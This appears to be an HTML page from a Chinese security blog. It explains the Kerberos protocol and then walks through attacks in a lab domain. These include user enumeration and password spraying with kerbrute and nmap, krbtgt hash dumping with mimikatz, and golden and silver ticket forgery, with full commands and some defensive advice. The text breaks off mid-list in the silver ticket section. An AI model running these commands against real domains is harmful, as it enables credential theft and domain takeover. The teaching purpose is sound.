@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:lzz]">
+<meta name="description" content="kerberos介绍 Kerberos（/ˈkərbərəs/）是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。这个词又指麻省理工学院为这个协议开发的一套计算机软件。软件设计上采用客户端/服务器结构，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。
+在kerberos协议中有三个角色：
+1. Client（访问服务） 2. Server（提供服务） 3. KDC（Key Distribution Cente）密钥分发中心 其中：
+KDC（Key Distribution Center）= 密钥分发中心 AS（Authentication Server）= 认证服务器 TGT（Ticket Granting Ticket）= TGT服务票据，由AS在AS-REP发放 TGS（Ticket Granting Server）= 票据授权服务器 ST（Server Ticket）=ST服务票据，由TGS在TGS-REP发放 kerberos协议分析 实验环境： 域名：HIRO 域控：WIN-KONG 域管：hiro\administrator 主机：DESKTOP-P34E60A 域用户:hiro\win10 在win10上执行：
+net use \\WIN-KONG\C$ password /u:hiro\administrator
+AS-REQ: 1.请求的客户端信息 3.加密类型 4.Authenticator（用户Hash加密时间戳） 客户端通过使用其凭据加密时间戳来执行预身份验证，以向 KDC 证明其拥有该帐户的凭据。使用时间戳而不是静态值有助于防止重放攻击。
+AS-REP: 1.通过活动目录查询用户得到用户的Hash，用Hash解密Authenticator，如果解密成功并且时间戳在规定时间内（一般为五分钟），则域认证成功。 2.生成由krbtgt用户Hash加密的TGT认购权证，用于确保客户端和DC进行安全通信的用户Hash加密后的Login Session Key(作为下一阶段的认证秘钥)。 3.返回TGT，Login Session Key，时间戳和PAC。（PAC包含用户SID，所在组等信息）  Ps:KRBTGT在域生成的时候这个用户会被自动创建，是秘钥发行中心服务账户，不能用做登录。
+ TGS-REQ: 1.客户端信息 2.Authenticator(Login Session Key加密时间戳) 3.TGT认购权限 4.访问的服务名 因为当前请求目标服务是文件共享，则将TGS提交给CIFS服务访问。
+padata：
+req-body：" />
+<meta name="keywords" content="homepage, blog, science, informatics, development, programming, AD" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://lzzbb.github.io/posts/2021/04/kerberos%E5%88%A9%E7%94%A8%E9%9D%A2/" />
+
+
+    <title>
+        
+            kerberos利用面 :: lzzzzzzz 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://lzzbb.github.io/main.2461b42f711aae674dd78e353275891fa072d7bf2ea9fbd577297a99dde78461.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://lzzbb.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://lzzbb.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://lzzbb.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://lzzbb.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://lzzbb.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://lzzbb.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="kerberos利用面">
+<meta itemprop="description" content="kerberos介绍 Kerberos（/ˈkərbərəs/）是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。这个词又指麻省理工学院为这个协议开发的一套计算机软件。软件设计上采用客户端/服务器结构，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。
+在kerberos协议中有三个角色：
+1. Client（访问服务） 2. Server（提供服务） 3. KDC（Key Distribution Cente）密钥分发中心 其中：
+KDC（Key Distribution Center）= 密钥分发中心 AS（Authentication Server）= 认证服务器 TGT（Ticket Granting Ticket）= TGT服务票据，由AS在AS-REP发放 TGS（Ticket Granting Server）= 票据授权服务器 ST（Server Ticket）=ST服务票据，由TGS在TGS-REP发放 kerberos协议分析 实验环境： 域名：HIRO 域控：WIN-KONG 域管：hiro\administrator 主机：DESKTOP-P34E60A 域用户:hiro\win10 在win10上执行：
+net use \\WIN-KONG\C$ password /u:hiro\administrator
+AS-REQ: 1.请求的客户端信息 3.加密类型 4.Authenticator（用户Hash加密时间戳） 客户端通过使用其凭据加密时间戳来执行预身份验证，以向 KDC 证明其拥有该帐户的凭据。使用时间戳而不是静态值有助于防止重放攻击。
+AS-REP: 1.通过活动目录查询用户得到用户的Hash，用Hash解密Authenticator，如果解密成功并且时间戳在规定时间内（一般为五分钟），则域认证成功。 2.生成由krbtgt用户Hash加密的TGT认购权证，用于确保客户端和DC进行安全通信的用户Hash加密后的Login Session Key(作为下一阶段的认证秘钥)。 3.返回TGT，Login Session Key，时间戳和PAC。（PAC包含用户SID，所在组等信息）  Ps:KRBTGT在域生成的时候这个用户会被自动创建，是秘钥发行中心服务账户，不能用做登录。
+ TGS-REQ: 1.客户端信息 2.Authenticator(Login Session Key加密时间戳) 3.TGT认购权限 4.访问的服务名 因为当前请求目标服务是文件共享，则将TGS提交给CIFS服务访问。
+padata：
+req-body："><meta itemprop="datePublished" content="2021-04-20T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-05-20T20:47:44+08:00" />
+<meta itemprop="wordCount" content="610"><meta itemprop="image" content="https://lzzbb.github.io/"/>
+<meta itemprop="keywords" content="AD," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lzzbb.github.io/"/>
+
+<meta name="twitter:title" content="kerberos利用面"/>
+<meta name="twitter:description" content="kerberos介绍 Kerberos（/ˈkərbərəs/）是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。这个词又指麻省理工学院为这个协议开发的一套计算机软件。软件设计上采用客户端/服务器结构，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。
+在kerberos协议中有三个角色：
+1. Client（访问服务） 2. Server（提供服务） 3. KDC（Key Distribution Cente）密钥分发中心 其中：
+KDC（Key Distribution Center）= 密钥分发中心 AS（Authentication Server）= 认证服务器 TGT（Ticket Granting Ticket）= TGT服务票据，由AS在AS-REP发放 TGS（Ticket Granting Server）= 票据授权服务器 ST（Server Ticket）=ST服务票据，由TGS在TGS-REP发放 kerberos协议分析 实验环境： 域名：HIRO 域控：WIN-KONG 域管：hiro\administrator 主机：DESKTOP-P34E60A 域用户:hiro\win10 在win10上执行：
+net use \\WIN-KONG\C$ password /u:hiro\administrator
+AS-REQ: 1.请求的客户端信息 3.加密类型 4.Authenticator（用户Hash加密时间戳） 客户端通过使用其凭据加密时间戳来执行预身份验证，以向 KDC 证明其拥有该帐户的凭据。使用时间戳而不是静态值有助于防止重放攻击。
+AS-REP: 1.通过活动目录查询用户得到用户的Hash，用Hash解密Authenticator，如果解密成功并且时间戳在规定时间内（一般为五分钟），则域认证成功。 2.生成由krbtgt用户Hash加密的TGT认购权证，用于确保客户端和DC进行安全通信的用户Hash加密后的Login Session Key(作为下一阶段的认证秘钥)。 3.返回TGT，Login Session Key，时间戳和PAC。（PAC包含用户SID，所在组等信息）  Ps:KRBTGT在域生成的时候这个用户会被自动创建，是秘钥发行中心服务账户，不能用做登录。
+ TGS-REQ: 1.客户端信息 2.Authenticator(Login Session Key加密时间戳) 3.TGT认购权限 4.访问的服务名 因为当前请求目标服务是文件共享，则将TGS提交给CIFS服务访问。
+padata：
+req-body："/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-04-20 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://lzzbb.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://lzzbb.github.io/posts">Posts</a></li><li><a href="https://lzzbb.github.io/tags/">Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        3 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://lzzbb.github.io/posts/2021/04/kerberos%E5%88%A9%E7%94%A8%E9%9D%A2/">kerberos利用面</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h2 id="kerberos介绍">kerberos介绍</h2>
+<p>Kerberos（/ˈkərbərəs/）是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。这个词又指麻省理工学院为这个协议开发的一套计算机软件。软件设计上采用客户端/服务器结构，并且能够进行相互认证，即客户端和服务器端均可对对方进行身份认证。</p>
+<p>在kerberos协议中有三个角色：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. Client（访问服务）
+</span></span><span class="line"><span class="cl">2. Server（提供服务）
+</span></span><span class="line"><span class="cl">3. KDC（Key Distribution Cente）密钥分发中心
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/1.png" alt=""></p>
+<p>其中：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">KDC（Key Distribution Center）= 密钥分发中心
+</span></span><span class="line"><span class="cl">AS（Authentication Server）= 认证服务器
+</span></span><span class="line"><span class="cl">TGT（Ticket Granting Ticket）= TGT服务票据，由AS在AS-REP发放
+</span></span><span class="line"><span class="cl">TGS（Ticket Granting Server）= 票据授权服务器
+</span></span><span class="line"><span class="cl">ST（Server Ticket）=ST服务票据，由TGS在TGS-REP发放
+</span></span></code></pre></div><h2 id="kerberos协议分析">kerberos协议分析</h2>
+<h3 id="实验环境">实验环境：</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">域名：HIRO
+</span></span><span class="line"><span class="cl">域控：WIN-KONG 域管：hiro\administrator
+</span></span><span class="line"><span class="cl">主机：DESKTOP-P34E60A 域用户:hiro\win10
+</span></span></code></pre></div><p>在win10上执行：</p>
+<p><code>net use \\WIN-KONG\C$ password /u:hiro\administrator</code></p>
+<h4 id="as-req">AS-REQ:</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.请求的客户端信息
+</span></span><span class="line"><span class="cl">3.加密类型
+</span></span><span class="line"><span class="cl">4.Authenticator（用户Hash加密时间戳）
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/2.png" alt=""></p>
+<p>客户端通过使用其凭据加密时间戳来执行预身份验证，以向 KDC 证明其拥有该帐户的凭据。使用时间戳而不是静态值有助于防止重放攻击。</p>
+<h4 id="as-rep">AS-REP:</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.通过活动目录查询用户得到用户的Hash，用Hash解密Authenticator，如果解密成功并且时间戳在规定时间内（一般为五分钟），则域认证成功。
+</span></span><span class="line"><span class="cl">2.生成由krbtgt用户Hash加密的TGT认购权证，用于确保客户端和DC进行安全通信的用户Hash加密后的Login Session Key(作为下一阶段的认证秘钥)。
+</span></span><span class="line"><span class="cl">3.返回TGT，Login Session Key，时间戳和PAC。（PAC包含用户SID，所在组等信息）
+</span></span></code></pre></div><blockquote>
+<p>Ps:KRBTGT在域生成的时候这个用户会被自动创建，是秘钥发行中心服务账户，不能用做登录。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/3.png" alt=""></p>
+<h4 id="tgs-req">TGS-REQ:</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.客户端信息
+</span></span><span class="line"><span class="cl">2.Authenticator(Login Session Key加密时间戳)
+</span></span><span class="line"><span class="cl">3.TGT认购权限
+</span></span><span class="line"><span class="cl">4.访问的服务名
+</span></span></code></pre></div><p><strong>因为当前请求目标服务是文件共享，则将TGS提交给CIFS服务访问。</strong></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/4.png" alt=""></p>
+<p>padata：</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/5.png" alt=""></p>
+<p>req-body：</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/6.png" alt=""></p>
+<h4 id="tgs-rep">TGS-REP：</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.检查自身是否存在请求的服务，如果存在，通过krbtgt解密TGT并且得到Login Session Key，通过Login Session Key解密Authenticator(Login Session Key加密时间戳)，就验证了对方身份。然后验证时间戳是否在范围内，并且验证TGT中的时间戳是否过期，原始地址是否和TGT保存的地址相同等。
+</span></span><span class="line"><span class="cl">2.生成用AS-REP得到的Login Session Key加密后的用于确保安全传输的Server Session Key。
+</span></span><span class="line"><span class="cl">3.完成认证后，TGS生成ST票据，其中包括：客户端信息和原始的Server Session Key，整个ST票据由该服务的NTLM Hash加密。
+</span></span><span class="line"><span class="cl">4.将ST和Server Session Key发送给客户端
+</span></span></code></pre></div><p><code>DC并不会验证当前请求TGS的用户是否具有对其请求服务的访问权限，它只验证TGT是否有效，并基于TGT的信息制作对应的TGS。</code></p>
+<h4 id="ap-req">AP-REQ:</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.客户端收到TGS服务后，通过自己缓存的Login Session Key解密得到原始的Server Session Key，
+</span></span><span class="line"><span class="cl">2.将ST和Authenticator（Server Session Key加密时间戳）发送给服务端。
+</span></span><span class="line"><span class="cl">3.客户端访问服务，将PAC传递给服务进行检查；服务通过PAC查看用户的SID和用户组等并与服务自身的ACL进行对比。
+</span></span><span class="line"><span class="cl">4.域控制器验证响应上的签名并将结果返回给服务器。该错误作为适当的RPC状态代码返回。
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/7.png" alt=""></p>
+<hr>
+<h4 id="ap-rep">AP-REP:</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.服务器验证AP-REQ，如果验证成功则发送AP-REP。
+</span></span><span class="line"><span class="cl">2.通过服务的NTLM Hash解密ST，从中提取Server Session Key。
+</span></span><span class="line"><span class="cl">3.通过提取出来的Server Session Key解密Authenticator，从而验证客户端身份。
+</span></span><span class="line"><span class="cl">4.将Server Session Key加密时间戳为Authenticator发送给客户端，客户端用缓存的Server Session Key进行解密，如果解密成功则说明两方有相同的Server Session Key。
+</span></span></code></pre></div><p><code>验证TGT中携带的PAC，KDC通过SID判断用户的用户组信息，用户权限等，进而将结果返回给Server，Server再将此信息与用户所索取的资源的ACL进行比较，最后决定是否给用户提供相应的服务</code></p>
+<h3 id="pac的作用">PAC的作用</h3>
+<p>只要用户通过预认证，拿到TGT，就能向TGS申请ST（kerberosat能利用的原因）。一切看起来好像合情合理，但是并没有判断用户是否拥有访问这个服务的权限，这就是PAC的作用。</p>
+<p><code>PAC在AS-REP过程中放在TGT里加密发送给Client，当Client需要访问Server所提供的某项服务时， Server为了判断用户是否具有合法的权限需要将Client的SID、用户所在的组等信息传递给KDC。KDC通过SID判断用户的用户组信息，用户权限等，进而将结果返回给Server，Server再将此信息与用户所索取的资源的ACL进行比较， 最后决定是否给用户提供相应的服务。</code></p>
+<p>有些服务并没有验证PAC，白银票据因此得到利用。如果验证了PAC的话，就算攻击者拥有服务Hash，制作了ST票据，也不能制作PAC(PAC由两个数字签名构成，而这两个数字签名分别由Server NTLM Hash和KDC NTLM Hash加密)，并且只有KDC才能制作和查看PAC。</p>
+<p>也恰恰是这个 PAC，造成了 MS14-068这个漏洞。该漏洞是位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏洞，它允许经过身份验证的用户在其获得的票证 TGT 中插入任意的 PAC，普通用户可以通过呈现具有改变了 PAC 的 TGT 来伪造票据获得管理员权限。</p>
+<h2 id="kerberos简要概括">kerberos简要概括</h2>
+<hr>
+<p>还是以上次使用域管与域控建立cifs的ipc连接为例</p>
+<blockquote>
+<p>net use \WIN-KONG\C$ password /u:hiro\administrator</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 用户使用该域管密码hash向域控制器 (DC) 进行身份验证。
+</span></span><span class="line"><span class="cl">2. DC在ntds对比该用户hash是否正确，如果正确返回用户TGT票据和PAC等信息。
+</span></span><span class="line"><span class="cl">3. 用户与域控建立cifs的ipc连接，在DC查询域控服务器的SPN。
+</span></span><span class="line"><span class="cl">4. 识别出SPN后，与DC建立通信并返回TGT，以及用户需要通信的SPN(在这里是域控机器的SPN)。
+</span></span><span class="line"><span class="cl">5. DC返回TGS票据给用户。
+</span></span><span class="line"><span class="cl">6. 用户拿着TGS请求访问域控的cifs，DC解密TGS并检查认证用户的PAC(含sid和组等信息)，判断用户是否有权限访问该服务。
+</span></span><span class="line"><span class="cl">7. 如果有访问该服务的权限，ipc连接成功，否则拒接连接。
+</span></span></code></pre></div><h2 id="kerberos攻击面">kerberos攻击面</h2>
+<h3 id="域用户枚举-密码喷洒kerbrute">域用户枚举 密码喷洒(kerbrute)</h3>
+<p>在kerberos的AS-REQ认证中当cname值中的用户不存在时返回包提示错误，当用户名存在时，密码正确或者错误返回包结果也不一样，所以可以尝试域用户枚举和密码喷洒攻击。</p>
+<h4 id="条件能正常访问到目标域控的-389验证-和-88爆破-端口">条件：能正常访问到目标域控的 389(验证) 和 88(爆破) 端口</h4>
+<p><code>#user.txt用户名文件格式不需要加@hiro.com</code></p>
+<h4 id="域内用户枚举">域内用户枚举</h4>
+<p>kerbrute：</p>
+<p><code>kerbrute_windows_amd64.exe userenum -—dc 192.168.10.10 -d hiro.com user.txt     </code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/8.png" alt=""></p>
+<p>nmap插件：</p>
+<p><code>nmap -sT -Pn -p 88 —script krb5-enum-users —script-args krb5-enum-users.realm=“域名”,userdb=“users.txt” 域控IP</code></p>
+<h4 id="密码喷洒--指定密码">密码喷洒  指定密码</h4>
+<p><code>kerbrute_windows_amd64.exe passwordspray —dc 192.168.10.10 -d hiro.com user.txt 123456</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/9.png" alt=""></p>
+<h4 id="域用户枚举密码喷洒攻击防范">域用户枚举、密码喷洒攻击防范</h4>
+<p>审查域控日志</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 验证成功时产生日志(4768：请求了 Kerberos 身份验证票证 (TGT))
+</span></span><span class="line"><span class="cl">2. 验证失败时产生日志(4771：Kerberos 预身份验证失败)
+</span></span></code></pre></div><hr>
+<h2 id="黄金白银票据">黄金&amp;白银票据</h2>
+<p><code>黄金白银票据均可在任何机器上生成和使用，即使是未加入域的机器。（域外机器需要将DNS指向域控）</code></p>
+<h3 id="黄金票据">黄金票据</h3>
+<p>TGT由krbtgt用户Hash加密，如果拥有krbtgt用户Hash就可以制作任意用户的TGT，从而得到ST服务票据，进而访问域控。</p>
+<h4 id="条件">条件</h4>
+<p>要创建黄金票据，需要以下信息:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.域名
+</span></span><span class="line"><span class="cl">2.域的SID值(域成员SID值去掉最后的)
+</span></span><span class="line"><span class="cl">3.krbtgt账号的哈希值或AES-256值
+</span></span><span class="line"><span class="cl">4.伪造的用户名
+</span></span></code></pre></div><h4 id="1在域控上用mimikatz导出krbtgt用户hash">1.在域控上用mimikatz导出krbtgt用户hash</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">lsadump::dcsync /domain:hiro.com /user:krbtgt
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/10.png" alt=""></p>
+<h4 id="2利用mimikatz制作administrator的tgt票据">2.利用mimikatz制作administrator的TGT票据</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">kerberos::golden /user:administrator /domain:hiro.com /sid:S-1-5-21-1909134247-741334235-3019370817 /krbtgt:5f468f6d7ac43c327396d832a0241d81 /ptt  
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/domain – 完全限定的域名。在本例中：“lab.adsecurity.org”。
+</span></span><span class="line"><span class="cl">/sid – 域的 SID。在本例中：“S-1-5-21-1473643419-774954089-2222329127”。
+</span></span><span class="line"><span class="cl">/sids – AD 林中帐户/组的其他 SID，具有您希望票证欺骗的权限。通常，这将是根域“S-1-5-21-1473643419-774954089-5872329127-519”的 Enterprise Admins 组。
+</span></span><span class="line"><span class="cl">/user – 要模拟的用户名
+</span></span><span class="line"><span class="cl">/groups（可选）– 用户所属的组 RID（第一个是主要组）。
+</span></span><span class="line"><span class="cl">添加用户或计算机帐户 RID 以接收相同的访问权限。
+</span></span><span class="line"><span class="cl">默认组为513。512,520,518,519 为知名管理员组（如下所列）。
+</span></span><span class="line"><span class="cl">/krbtgt – 域 KDC 服务帐户 (KRBTGT) 的 NTLM 密码哈希。用于对 TGT 进行加密和签名。
+</span></span><span class="line"><span class="cl">/ticket（可选） - 提供保存金票文件的路径和名称以备后用，或使用 /ptt 立即将金票注入内存以供使用。
+</span></span><span class="line"><span class="cl">/ptt - 作为 /ticket 的替代 - 使用它可以立即将伪造的票据注入内存以供使用。
+</span></span><span class="line"><span class="cl">/id（可选）——用户 RID。Mimikatz 默认为 500（默认管理员帐户 RID）。
+</span></span><span class="line"><span class="cl">/startoffset（可选）——票证可用时的起始偏移量（如果使用此选项，通常设置为 –10 或 0）。Mimikatz 默认值为 0。
+</span></span><span class="line"><span class="cl">/endin（可选）– 票证有效期。Mimikatz 默认值为 10 年（~5,262,480 分钟）。Active Directory 默认 Kerberos 策略设置为 10 小时（600 分钟）。
+</span></span><span class="line"><span class="cl">/renewmax（可选）– 续订的最长票证有效期。Mimikatz 默认值为 10 年（~5,262,480 分钟）。Active Directory 默认 Kerberos 策略设置为 7 天（10,080 分钟）。
+</span></span><span class="line"><span class="cl">/sids（可选）– 设置为 AD 林中 Enterprise Admins 组的 SID ([ADRootDomainSID]-519) 以欺骗整个 AD 林中的企业管理员权限（AD 林中每个域中的 AD 管理员）。
+</span></span><span class="line"><span class="cl">/aes128 – AES128 密钥
+</span></span><span class="line"><span class="cl">/aes256 – AES256 密钥
+</span></span></code></pre></div><p>mimikatz输入kerberos::list查看该票据，或者在机器上cmd窗口输入klist(cmd需要以管理员权限运行)也能查到该票据</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/11.png" alt=""></p>
+<p>用impacket中的ticketer.py生成</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/12.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/13.png" alt=""></p>
+<h4 id="验证是否成功target需要指向fqdn">验证是否成功（target需要指向FQDN）：</h4>
+<p>在Client端通过Psexec.exe工具来与域控进行连接</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/14.png" alt=""></p>
+<p>或者直接建立ipc$连接</p>
+<p><code>net use \\WIN-KONG.hiro.com\c$</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/15.png" alt=""></p>
+<h4 id="黄金票据攻击防范">黄金票据攻击防范</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 将 TGS 请求与之前的 TGT 请求相关联，如果没有先前的 TGT 请求（在阈值内），则 TGS 请求可能与黄金票相关。
+</span></span><span class="line"><span class="cl">2. 使用黄金票据能够在一个域环境中长时间控制整个域，并且日志无法溯源，最根本的办法是不允许域管账户登录其他服务器。
+</span></span><span class="line"><span class="cl">3. 定期修改KRBTGT密码（重复修改两次），使得原有的票据失效。
+</span></span></code></pre></div><h4 id="注为什么要连续修改两次">注：为什么要连续修改两次？</h4>
+<blockquote>
+<p>KRBTGT帐户被禁用并存储当前密码以及前一个密码。KRBTGT密码哈希用于在Kerberos票证中签署PAC以及加密TGT。如果票证使用不同的密钥（密码）签名/加密，则KDC需要检查KRBTGT以前的密码以查看是否成功。</p>
+</blockquote>
+<hr>
+<h3 id="白银票据">白银票据</h3>
+<p>ST由服务Hash加密，如果有了服务Hash，就可以签发任意用户的ST票据，不需要跟域控打交道，但是只能访问特定服务。</p>
+<p>制作白银票据没有经过 AS-REQ / AS-REP，也没有与域控制器的 TGS-REQ / TGS-REP通信。因为 Silver Ticket 是伪造的 TGS，因此无法与域控制器通信。</p>
+<p>大多数服务不验证 PAC，因此使用服务帐户密码哈希生成的有效 TGS 可以包含完全虚构的 PAC；伪造的白银票据没有带有效KDC签名的PAC，如果目标验证了KDC的PAC签名，那么白银票据就不起作用了。</p>
+<p>要创建白银票据，需要以下信息:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.域名
+</span></span><span class="line"><span class="cl">2.域的SID值(域成员SID值去掉最后的)
+</span></span><span class="line"><span class="cl">3.目标服务的FQDN
+</span></span><span class="line"><span class="cl">4.服务账号的HTLM哈希
+</span></span></code></pre></div><p>利用白银票据伪造CIFS服务权限（CIFS服务常用于Windows主机之间的文件共享）</p>
+<p>如果伪造HOST服务权限的话将获得目标计算机上涵盖的任何 Windows 服务的管理员权限。</p>
+<h4 id="1在域控使用mimikatz获得域控的ntlm哈希">1.在域控使用mimikatz获得域控的NTLM哈希</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">privilege::Debug
+</span></span><span class="line"><span class="cl">sekurlsa::logonpasswords
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/kerberos/16.png" alt=""></p>
+<h4 id="2利用mimikatz制作administrator指向域控的cifs服务的tgs票据">2.利用mimikatz制作administrator指向域控的cifs服务的TGS票据</h4>
+<p><code>kerberos::golden /domain:hiro.com /sid:S-1-5-21-1909134247-741334235-3019370817 /target:WIN-KONG.hiro.com /service:cifs /rc4:39107db5b42b1cfb9f3f38520bb4c0f3 /user:administrator /ptt</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/domain – 完全限定的域名。在本例中：“lab.adsecurity.org”。
+</span></span><span class="line"><span class="cl">/sid – 域的 SID。在本例中：“S-1-5-21-1473643419-774954089-2222329127”。
+</span></span><span class="line"><span class="cl">/sids – AD 林中帐户/组的其他 SID，具有您希望票证欺骗的权限。通常，这将是根域“S-1-5-21-1473643419-774954089-5872329127-519”的 Enterprise Admins 组。
+</span></span><span class="line"><span class="cl">/用户 – 要模拟的用户名
+</span></span><span class="line"><span class="cl">/groups（可选）– 用户所属的组 RID（第一个是主要组）.  默认值为513。512,520,518,519 用于众所周知的管理员组。
+</span></span><span class="line"><span class="cl">/ticket（可选） - 提供保存伪造票据文件的路径和名称以备后用或使用 /ptt 立即将黄金票据注入内存以供使用。
+</span></span><span class="line"><span class="cl">/ptt - 作为 /ticket 的替代 - 使用它可以立即将伪造的票据注入内存以供使用。
+</span></span><span class="line"><span class="cl">/id (可选) – 用户 RID。Mimikatz 默认为 500（默认管理员帐户 RID）。
+</span></span><span class="line"><span class="cl">/startoffset（可选）——票证可用时的起始偏移量（如果使用此选项，通常设置为 –10 或 0）。Mimikatz 默认值为 0。
+</span></span><span class="line"><span class="cl">/endin（可选）– 票证有效期。Mimikatz 默认值为 10 年（~5,262,480 分钟）。Active Directory 默认 Kerberos 策略设置为 10 小时（600 分钟）。
+</span></span><span class="line"><span class="cl">/renewmax（可选）– 续订的最长票证有效期。Mimikatz 默认值为 10 年（~5,262,480 分钟）。Active Directory 默认 Kerberos 策略设置为 7 天（10,080 分钟）。
+</span></span><span class="line"><span class="cl">/aes128 – AES128 密钥
